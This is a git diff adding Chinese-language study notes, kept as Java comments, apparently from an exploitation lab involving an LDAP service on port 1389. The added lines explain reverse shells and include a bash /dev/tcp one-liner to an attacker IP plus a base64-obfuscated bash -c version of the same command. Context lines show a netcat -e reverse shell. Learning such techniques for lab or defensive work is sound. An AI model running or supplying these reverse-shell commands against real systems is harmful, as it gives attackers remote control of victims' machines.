@@ -191,6 +191,12 @@ public class Summary1 {
      * （nc反弹：nc -e /bin/bash 攻击者IP 4444）还可以telnet反弹
      * 然后被攻击者就与攻击者连上了
      * 攻击者就可以给对方服务器发请求了
+     * /dev/tcp/ip/port 一般来说这个文件时不存在的 但是如果开启了监听的端口 就是可以相互之间发请求的
+     * 直接使用bash -i可能会显示 zsh目录不存在
+     * 就给bash -i用base 64加密
+     * # /bin/bash -i >& /dev/tcp/192.168.35.152/7777 0>&1
+     * bash -c '{echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzUuMTUyLzc3NzcgMD4mMSAgIA==}|{base64,-d}|{bash,-i}'
+     * 中间那块加密部分就是上面注释的语句（可以自己解码看看）
      *
      * 开启LDAP服务
      * 1389 指LDAP服务的端口
@@ -226,6 +232,9 @@ public class Summary1 {
      * 然后docker stop    容器id
      * 然后删除容器
      * 然后在删除镜像
+     * docker compose exec 是docker compose 的执行命令
+     *
+     *
      *
      * poc漏洞验证
      * EXP 漏洞利用
